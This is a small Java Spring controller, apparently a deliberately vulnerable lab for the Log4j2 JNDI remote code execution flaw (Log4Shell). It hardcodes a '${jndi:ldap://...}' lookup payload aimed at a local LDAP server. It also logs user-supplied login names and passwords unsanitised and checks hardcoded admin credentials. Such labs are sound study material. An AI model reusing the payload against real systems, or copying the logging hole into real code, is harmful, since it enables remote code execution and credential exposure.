package com.kk.log4j2_rce.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.util.Map;

@Controller
public class UserController {
    private Logger logger= LogManager.getLogger(UserController.class);

    @RequestMapping("/hello")
    @ResponseBody
    public String hello(){
        logger.info("hello ");
        logger.error("${jndi:ldap://127.0.0.1:10086/a}");

        return "hello";
    }

    @RequestMapping(value = "/login",method = {RequestMethod.POST})
    @ResponseBody
    public String login(@RequestBody Map body){
        String username=body.get("username").toString();
        String password=body.get("password").toString();
        if(username.equals("admin") && password.equals("123456")){
            logger.error("login:{},pass:{}",username,password);
            return "success";
        }
        logger.error("login:{},pass:{}",username,password);

//        logger.error("${jndi:ldap://127.0.0.1:1389/a}");

        return "failed";
    }
}
